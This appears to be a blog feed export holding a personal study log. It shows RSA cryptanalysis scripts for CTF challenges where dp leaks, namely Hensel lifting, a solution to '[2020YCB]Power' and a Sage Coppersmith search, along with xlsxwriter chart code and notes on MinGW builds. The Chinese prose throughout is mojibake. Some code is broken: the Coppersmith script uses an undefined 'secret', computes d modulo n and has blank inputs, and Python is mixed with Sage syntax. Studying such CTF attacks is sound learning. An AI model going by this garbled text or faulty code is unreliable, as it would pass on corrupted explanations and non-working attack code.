<span class="string">&#x27;=test-sheet1!$A$2:$A$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=test-sheet1!$C$2:$C$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;pie&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">chart.add_series(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;=test-sheet1!$D$1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=test-sheet1!$A$2:$A$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=test-sheet1!$D$2:$D$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;blue&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;pie&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;blue&#x27;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">chart.set_title(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;æµ‹è¯•&#x27;</span>&#125;)</span><br><span class="line">chart.set_x_axis(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;xè½´&quot;</span>&#125;)</span><br><span class="line">chart.set_y_axis(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yè½´&#x27;</span>&#125;)          <span class="comment">#è®¾ç½®å›¾è¡¨è¡¨å¤´åŠåæ ‡è½´</span></span><br><span class="line"> </span><br><span class="line">chart.set_style(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># chart.set_style(37)</span></span><br><span class="line"> </span><br><span class="line">worksheet1.insert_chart(<span class="string">&#x27;B8&#x27;</span>,chart,&#123;<span class="string">&#x27;x_offset&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;y_offset&#x27;</span>:<span class="number">10</span>&#125;)   <span class="comment">#æ”¾ç½®å›¾è¡¨ä½ç½®</span></span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">å®˜æ–¹æ–‡æ¡£ï¼šhttps://xlsxwriter.readthedocs.io/chart.html</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>xlsx</tag>
      </tags>
  </entry>
  <entry>
    <title>WeeklyStudy</title>
    <url>/2023/12/31/WeeklyStudy/</url>
    <content><![CDATA[<p>2023æ‘¸é±¼ç¬”è®°å“ˆå“ˆå“ˆå“ˆã€‚</p>
<span id="more"></span><!--toc-->

<h1 id="230201"><a href="#230201" class="headerlink" title="230201"></a>230201</h1><h2 id="dpæ³„éœ²ä»¥åŠä¸€äº›æ‰©å±•"><a href="#dpæ³„éœ²ä»¥åŠä¸€äº›æ‰©å±•" class="headerlink" title="dpæ³„éœ²ä»¥åŠä¸€äº›æ‰©å±•"></a>dpæ³„éœ²ä»¥åŠä¸€äº›æ‰©å±•</h2><h3 id="n-e-dp-c"><a href="#n-e-dp-c" class="headerlink" title="n, e, dp, c"></a>n, e, dp, c</h3><p>å³åŸºç¡€$dp$ï¼Œéœ€è¦è¿›è¡Œä¸€å®šæ¨å¯¼ï¼Œä¸»è¦ä»¥æ¨å¯¼ï¼‹çˆ†ç ´çš„æ€æƒ³ï¼Œå¯¹nè¿›è¡Œåˆ†è§£ï¼Œä»è€Œå¾—åˆ°$p$, $q$ã€‚</p>
<h3 id="å˜ç§1ï¼š-n-x3D-p-b-cdot-q"><a href="#å˜ç§1ï¼š-n-x3D-p-b-cdot-q" class="headerlink" title="å˜ç§1ï¼š$n &#x3D; p^{b} \cdot q$"></a>å˜ç§1ï¼š$n &#x3D; p^{b} \cdot q$</h3><img src="/2023/12/31/WeeklyStudy/hense_lifting.png" class="" title="hensel lifting">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>

<h4 id="2020YCB-Power"><a href="#2020YCB-Power" class="headerlink" title="[2020YCB]Power"></a>[2020YCB]Power</h4><p>å…³äºåè¿›åˆ¶ä½æ•°ä¸äºŒè¿›åˆ¶ä½æ•°ã€‚</p>
<p>æ„Ÿè§‰åè¿›åˆ¶çš„ä¸ä¼šå¤ªå®¹æ˜“æ¯”è¾ƒï¼Œè¿˜æ˜¯ç›´æ¥æ¯”è¾ƒäºŒè¿›åˆ¶çš„ç›¸å¯¹æ¥è¯´ä¼šæ¯”è¾ƒå‡†ç¡®ä¸€ç‚¹ã€‚äºŒè¿›åˆ¶çš„è¯ä¸»è¦åˆ©ç”¨<code>bit_length()</code>å‡½æ•°ã€‚<br>$$<br>d\times e \equiv 1 \mod phi \equiv 1\mod (p-1)<br>$$</p>
<p>$$<br>dp \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>k \times ( p - 1 ) &#x3D; dp \times e - 1<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># num = dp * e - 1</span></span><br><span class="line"><span class="comment"># num.bit_length() ä¸º 526</span></span><br><span class="line"><span class="comment"># yafuå¯¹numè¿›è¡Œåˆ†è§£ï¼Œä»è€Œå¾—åˆ°å› å­</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">factor:</span></span><br><span class="line"><span class="string">P1 = 2 # 1 digits</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P2 = 11 # 2</span></span><br><span class="line"><span class="string">P4 = 7411 # 4</span></span><br><span class="line"><span class="string">P14 = 10402958442703 # 14</span></span><br><span class="line"><span class="string">P17 = 25388174482857437 # 17</span></span><br><span class="line"><span class="string">P23 = 19976951634728916570101 # 23</span></span><br><span class="line"><span class="string">P33 = 121098273308863403811867260913043 # 33</span></span><br><span class="line"><span class="string">P69 = 514664028984426592785192432611128951474323755859087258008037664208623 # 69</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># åˆ©ç”¨èŒƒå›´æ¡†å®špå€¼ï¼Œç»è¿‡è¯•éªŒå¾—ï¼š</span></span><br><span class="line">p = num // <span class="number">7411</span> // <span class="number">2</span> // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"><span class="comment"># print(p.bit_length())</span></span><br><span class="line"><span class="comment"># 512</span></span><br><span class="line"><span class="comment"># åˆ¤å®šæ¡ä»¶</span></span><br><span class="line"><span class="comment"># 1. æ•°å€¼é•¿åº¦æ˜¯å¦512</span></span><br><span class="line"><span class="comment"># 2. æ‰€å¾—pæ˜¯ä¸æ˜¯ç´ æ•°</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦åˆ©ç”¨åˆ†è§£å‡ºæ¥çš„factorsï¼Œæ¥è¿›è¡Œè¯•é”™ï¼Œç„¶åé€šè¿‡æŸ¥çœ‹bitä½æ•°çš„å‡½æ•°ï¼Œå”¯ä¸€çš„pç»™è¯•å‡ºæ¥ã€‚<br>$$<br>c \equiv m^{e} \mod n<br>$$</p>
<p>$$<br>dp \equiv d (\mod p-1)<br>$$</p>
<p>$$<br>\rightarrow c^{dp} \equiv m^{e\cdot dp} \mod n<br>$$</p>
<p>$$<br>\rightarrow c^{dp} \mod p \equiv m^{e \cdot dp} \mod p<br>$$</p>
<p>$$<br>d\cdot e \equiv 1 \mod lcm(p-1, q-1)<br>$$</p>
<p>$$<br>\rightarrow e\cdot dp \equiv d \cdot e \mod (p-1) \equiv 1 \mod (p-1)<br>$$</p>
<p>$$<br>\rightarrow k\cdot (p-1) &#x3D; e \cdot dp - 1<br>$$</p>
<p>$$<br>\exist k \in \mathbb{Z}, c^{dp}\mod p &#x3D; m^{k\cdot (p-1) + 1} \mod p<br>$$</p>
<p>è´¹é©¬å®šç†å¯å¾—$a^{p-1} \mod p \equiv 1$.<br>$$<br>\Longrightarrow m \cdot m^{k\cdot (p-1)} \mod p \equiv c^{dp} \mod p<br>$$</p>
<p>$$<br>\Longrightarrow m \equiv c^{dp} \mod p<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Hensel lifting for Takagiâ€™s scheme</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dp = <span class="number">3272293505696712831419859641571956066667516012597886098021642320155056349966612629986261146617139998624603483170466852538289743936225789351270153550594329</span></span><br><span class="line">c = <span class="number">22524257534087703614496632403022329621384173069680778965750290698059674588465640878754707363673789674111671270645152584118206145007310499274423606886261969807360070526126452646719628307689968971699215841867636770320159256301550908771135042912287955209485328267670825390080110910391913063177323585204392804538642393453388536211144485389902591029350060800993352969569703901717308330574394200996651534321547814313195218895547718815009876393987398738932001924661338796059973950012706427109598830049455186171345179840564502215531573714428772608739268313985559628612004439028014417408631851880698512023740903181116906766066951473942201698375224240271523568161242951730224901227589413731025281719101368668617497947995579443908773425555177346524678673641140157885033923288401884</span></span><br><span class="line">c1 = <span class="number">290707924192892686920253390955676600323331633814839708838347288502692494699485764473635783441705302268064111648851157070038783719749721994682837294625334517914882191486257362565066745587415388291939979195637720350919055988532145531805200483161599965215275808797976727969023747299578173497083532351976473770041800769265319548352841139802163279116490053292316399038329210043455932786945180855178341998049756983301499491011851026499269682821602212971062877270127451987836730083380463825717889123804613394241190839837791281657872259492589868751745327696030438893865069941066073554427558697972551085353027574529823439588670263047287131740802375738439636789806332323994866753085014446479034974063195632514803340511247735647970572837053148490258113394359072976858781060349776921428492973183958437965966963122069107876143476772436757554253049619918403996315720023020827394900507088006299225934263699192253079026440287311664705744424959801981503191480257138833694306501816837037995549817186335377411638035575004595417788588264823861850877111374085336446477943372458378834664678094751978400910288151519902977326995118727880223621964441498323865158898463327323193833062919619201107279964663654606753750042791368210261574897455830722232022689695292080269205470491791950839486861811469879413313773338916781857981641910031441448964144000585506870170898052132929034349451945051362244755750988705018897859238859476967568556992146975789444151432386692872801263000639711599152191790766776280</span></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pè§£æ³•1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># num = e * dp - 1</span></span><br><span class="line"><span class="comment"># p = (e * dp - 1) // 7411 // 2 // 2 + 1</span></span><br><span class="line"><span class="comment"># # print(p.bit_length())</span></span><br><span class="line"><span class="comment"># # print(is_prime(p))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from sympy import *</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pè§£æ³•2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># x = discrete_log(y, c1, 2)</span></span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line"><span class="comment"># print(type(x))</span></span><br><span class="line"><span class="comment"># print(type(y))</span></span><br><span class="line">x = <span class="number">5535722692962580764045545539105119140941061679289569420988353884209653851308860058948669740693107863231179565602072744542122031789184119031739723962825082929025825322421201364211726001366490949760887367407718763255964735567971493859197583624076478457865073449246835949075135223468616834636386958924709024763349115622062848212445867198457630368236782421195503713107838541903829979118327675371550868768159024260793541264335548489228744367609071659968450303895118817379316060805148754136917043160175570565717388336822960389664337656603584425629662613786203920234401824957121860225422901340950436355650311392398098947210940</span></span><br><span class="line">p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y))</span><br><span class="line"><span class="comment"># R = PolynomialRing(GF(y), name = &#x27;p&#x27;)</span></span><br><span class="line">f = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span> - x</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line">f.roots()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pè§£æ³•3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%x==<span class="number">0</span>:</span><br><span class="line">        p=(dp*e-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> c1 == <span class="built_in">pow</span>(g, x, y):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">è§£æ³•2ï¼šæ ¹æ®Hensel lifting for Takagiâ€™s schemeç®—æ³•è¿›è¡Œè§£å¯†</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">m = <span class="built_in">int</span>(dp_hensel(c, e, dp, p, b))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># è§£æ³•1ï¼šåˆ©ç”¨æ¨å¯¼å®šä½å…³é”®å…¬å¼è¿›è¡Œè§£å¯†</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># # m = pow(c, dp, p)</span></span><br><span class="line"><span class="comment"># # print(m)</span></span><br><span class="line"><span class="comment"># # print(long_to_bytes(m))</span></span><br></pre></td></tr></table></figure>

<h3 id="å˜ç§2ï¼šCoppersmithæ”»å‡»ï¼Œå·²çŸ¥dpé«˜ä½æ”»å‡»"><a href="#å˜ç§2ï¼šCoppersmithæ”»å‡»ï¼Œå·²çŸ¥dpé«˜ä½æ”»å‡»" class="headerlink" title="å˜ç§2ï¼šCoppersmithæ”»å‡»ï¼Œå·²çŸ¥dpé«˜ä½æ”»å‡»"></a>å˜ç§2ï¼šCoppersmithæ”»å‡»ï¼Œå·²çŸ¥dpé«˜ä½æ”»å‡»</h3><img src="/2023/12/31/WeeklyStudy/coppersmith-high.png" class="" title="coppersmith">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">dp0 = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">d = inverse_mod(e, n)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">	f = (secret &lt;&lt; <span class="number">200</span>) + x + (k - <span class="number">1</span>) * d <span class="comment"># 200 editable</span></span><br><span class="line">	x0 = f.small_roots(X=<span class="number">2</span> ** (<span class="number">200</span> + <span class="number">1</span>), beta=<span class="number">0.44</span>, epsilon=<span class="number">1</span>/<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(x0) != <span class="number">0</span>:</span><br><span class="line">		dp = x0[<span class="number">0</span>] + (secret &lt;&lt; <span class="number">200</span>)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e):</span><br><span class="line">			p = (e * Integer(dp) - <span class="number">1</span> + i) // i</span><br><span class="line">			<span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> p &lt; <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;k = &#x27;</span>,k)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>,p)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;dp = &#x27;</span>,dp)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="å˜ç§3ï¼š-p-x3D-gcd-m-e-cdot-dp-m-n"><a href="#å˜ç§3ï¼š-p-x3D-gcd-m-e-cdot-dp-m-n" class="headerlink" title="å˜ç§3ï¼š$p &#x3D; gcd(m^{e \cdot dp} - m, n)$"></a>å˜ç§3ï¼š$p &#x3D; gcd(m^{e \cdot dp} - m, n)$</h3><img src="/2023/12/31/WeeklyStudy/gcd.png" class="" title="extension">

<h3 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h3><p>è¿˜æœ‰å¾ˆå¤šå˜ç§ï¼Œæš‚ä¸”ä¸æ˜ç™½åŸç†ï¼Œå…ˆæ”¾ç€äº†ã€‚</p>
<h2 id="sagemath-preparse"><a href="#sagemath-preparse" class="headerlink" title="sagemath-preparse"></a>sagemath-preparse</h2><p>ä½“ç°å‚æ•°è°ƒç”¨è¿‡ç¨‹ï¼Œè™½ç„¶ä»£ç è¿˜æ²¡å‡ºæ¥ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230201140710662.png" class="" title="preparse">

<h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><p>æ— æ³•ç†è§£ï¼Œä¸ºå•¥è¿™ç§å®šä¹‰èƒ½å¤ŸæŠ¥é”™ï¼Œè¿™å‡ºç°å•¥é—®é¢˜äº†å—ï¼Ÿ</p>
<img src="/2023/12/31/WeeklyStudy/image-20230202092522249.png" class="" title="question">

<p>â€¦â€¦æ²¡ææ‡‚ï¼Œå…ˆæ”¾å¼ƒäº†ã€‚</p>
<p>ç–‘ä¼¼å¯è§£ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># original: R.&lt;x&gt; = PolynomialRing(GF(y))</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">R.&lt;x&gt; = GF(y)[]</span><br><span class="line"></span><br><span class="line"><span class="comment"># failed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># success</span></span><br><span class="line">p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y)) <span class="comment"># å®šä¹‰pä¸ºGF(y)ç¯ä¸Šçš„å¤šé¡¹å¼æœªçŸ¥å˜é‡</span></span><br></pre></td></tr></table></figure>

<p><em>0203ï¼Œä¸ä¼šæ•´ï¼Œä¸æäº†ã€‚</em></p>
<p><em><strong>0208ï¼Œä¼šæ•´äº†ï¼Œå…ˆå®šä¹‰ã€‚</strong></em></p>
<h1 id="230202"><a href="#230202" class="headerlink" title="230202"></a>230202</h1><h2 id="ç‰ˆæœ¬é€‰æ‹©"><a href="#ç‰ˆæœ¬é€‰æ‹©" class="headerlink" title="ç‰ˆæœ¬é€‰æ‹©"></a>ç‰ˆæœ¬é€‰æ‹©</h2><p>MinGW å„ç‰ˆæœ¬å‚æ•°è¯´æ˜<br>MinGW å¯ä»¥é€‚åº”ä¸åŒç³»ç»Ÿå¼€å‘ç¯å¢ƒï¼Œå› æ­¤æœ‰å‡ å¤§å‚æ•°éœ€è¦è¿›è¡Œé€‰æ‹©ï¼š Versionã€Architectureã€Threadsã€Exception</p>
<ul>
<li><p>Versionï¼šæŒ‡çš„æ˜¯ä½ é€‰æ‹©çš„ GCC ç¼–è¯‘å™¨çš„ç‰ˆæœ¬ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯å½“å‰æœ€æ–°ç‰ˆæœ¬ 8.1.0ï¼Œä¸€èˆ¬å»ºè®®é€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬ï¼›</p>
</li>
<li><p>Architectureï¼šæŒ‡çš„æ˜¯ä½ çš„ç”µè„‘çš„ç³»ç»Ÿç±»å‹ï¼Œi686 è¡¨ç¤ºçš„æ˜¯ 32 ä½çš„ç³»ç»Ÿç±»å‹ï¼Œx86_64 è¡¨ç¤ºçš„æ˜¯ 64 ä½çš„ç³»ç»Ÿç±»å‹ï¼›</p>
</li>
<li><p>Threadsï¼šæŒ‡çš„æ˜¯çº¿ç¨‹æ¨¡å‹ï¼Œposix æˆ– win32</p>
<ul>
<li><p>POSIXï¼ˆPortable Operating System Interfaceï¼Œå¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼‰ï¼Œæ˜¯ UNIX ç³»ç»Ÿçš„ä¸€ä¸ª API è®¾è®¡æ ‡å‡†ï¼Œå¾ˆå¤šç±» UNIX ç³»ç»Ÿä¹Ÿåœ¨æ”¯æŒå…¼å®¹è¿™ä¸ªæ ‡å‡†ï¼Œå¦‚ Linux æ“ä½œç³»ç»Ÿã€‚å¦‚æœåœ¨ Windows ä¸‹å¼€å‘ Linux åº”ç”¨ç¨‹åºï¼Œåˆ™é€‰æ‹© posixï¼›</p>
</li>
<li><p>Win32ï¼Œæ˜¯ Windows ç³»ç»Ÿä¸‹ä¸€ä¸ª API è®¾è®¡æ ‡å‡†ï¼Œå¦‚æœå¼€å‘ Windows å¹³å°ä¸‹çš„åº”ç”¨ç¨‹åºï¼Œå°±éœ€è¦é€‰æ‹© Win32ï¼›</p>
</li>
</ul>
</li>
<li><p>Exceptionï¼šæŒ‡çš„æ˜¯å¼‚å¸¸å¤„ç†æ¨¡å‹ã€‚i686 ç³»ç»Ÿæ¶æ„æœ‰ä¸¤ç§é€‰æ‹©ï¼šdwarf å’Œ sjljï¼›x86_64 ç³»ç»Ÿæ¶æ„ä¹Ÿæœ‰ä¸¤ç§é€‰æ‹©ï¼šseh å’Œ sjljã€‚</p>
<ul>
<li>sjljï¼Œsehï¼Œdwarf ä¸‰è€…çš„åŒºåˆ«ï¼šåœ¨C++ä¸­æœ‰ tryâ€¦throwâ€¦catchï¼Œå½“å®ƒæ‰§è¡Œè¿™ç§ç»“æ„æ—¶ï¼Œå®ƒéœ€è¦ä¿å­˜ç°åœºè¿˜åŸç°åœºï¼Œè€Œ sjljï¼Œsehï¼Œdwarf æ­£æ˜¯å®ç°è¿™ç±»è¿‡ç¨‹çš„ä¸‰ç§æ–¹å¼ã€‚</li>
<li>sjlj å…¨ç§°æ˜¯ SetJump &#x2F; LongJumpï¼Œå‰è€…è®¾è¿˜åŸç‚¹ï¼Œåè€…è·³åˆ°è¿˜åŸç‚¹ã€‚å¯ç”¨äº 32 ä½æˆ–è€… 64 ä½ç³»ç»Ÿã€‚</li>
<li>sehï¼ˆStructured Exception Handlingï¼Œç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼‰æ˜¯ Borland å…¬å¸çš„ï¼Œå¾®è½¯ä¹°äº†å…¶ä¸“åˆ©ä½¿ç”¨æƒï¼Œå®ƒåˆ©ç”¨äº† FS æ®µå¯„å­˜å™¨ï¼Œå°†è¿˜åŸç‚¹å‹å…¥æ ˆï¼Œæ”¶åˆ°å¼‚å¸¸æ—¶å†å¼¹å‡ºã€‚ç›¸è¾ƒè€Œè¨€ï¼Œsjlj æ˜¯ C æ ‡å‡†åº“å°±æœ‰çš„ä¸œè¥¿ï¼Œseh åœ¨ 2014 å¹´å‰æ˜¯æœ‰ä¸“åˆ©çš„ï¼Œä»æ€§èƒ½ä¸Šè¯´ seh æ¯” sjlj å¿«ã€‚åªç”¨äº64ä½ç³»ç»Ÿã€‚</li>
<li>dwarf åªæ”¯æŒ32ä½ç³»ç»Ÿ â€“ æ²¡æœ‰æ°¸ä¹…çš„è¿è¡Œæ—¶é—´å¼€é”€ â€“ éœ€è¦æ•´ä¸ªè°ƒç”¨å †æ ˆè¢«å¯ç”¨ï¼Œè¿™æ„å‘³ç€exceptionä¸èƒ½è¢«æŠ›å‡ºï¼Œä¾‹å¦‚Windowsç³»ç»ŸDLLã€‚</li>
</ul>
</li>
<li><p>ç»¼ä¸Šæ‰€è¿°ï¼š</p>
<ul>
<li>ã€x86_64 64ä½ã€‘<ol>
<li>seh æ˜¯æ–°å‘æ˜çš„ï¼Œè€Œ sjlj åˆ™æ˜¯å¤è€çš„ã€‚åªç”¨äº64ä½ç³»ç»Ÿã€‚</li>
<li>seh æ€§èƒ½æ¯”è¾ƒå¥½ï¼Œä½†ä¸æ”¯æŒ 32ä½ã€‚ sjlj ç¨³å®šæ€§å¥½ï¼Œæ”¯æŒ 32ä½å’Œ64ä½ã€‚</li>
<li>å› æ­¤ï¼Œx86_64 ç³»ç»Ÿæ¶æ„çš„æ¨èä½¿ç”¨ seh çš„å¼‚å¸¸å¤„ç†æ¨¡å‹ã€‚</li>
</ol>
</li>
<li>ã€i686 32ä½ã€‘<ol>
<li>dwarf åªæ”¯æŒ 32 ä½ï¼Œè€Œ sjlj æ”¯æŒ 32 ä½æˆ–64 ä½ï¼Œä½†æ˜¯ dwarf çš„æ€§èƒ½è¦ä¼˜äº sjljã€‚</li>
<li>å› æ­¤ï¼Œi686 ç³»ç»Ÿæ¶æ„çš„æ¨èä½¿ç”¨ dwarf çš„å¼‚å¸¸å¤„ç†æ¨¡å‹ã€‚</li>
</ol>
</li>
</ul>
</li>
</ul>
<blockquote>
<p> &lt;https: wiki.qt.io&#x3D;â€â€ mingw-64-bit&#x3D;â€â€</p>
</blockquote>
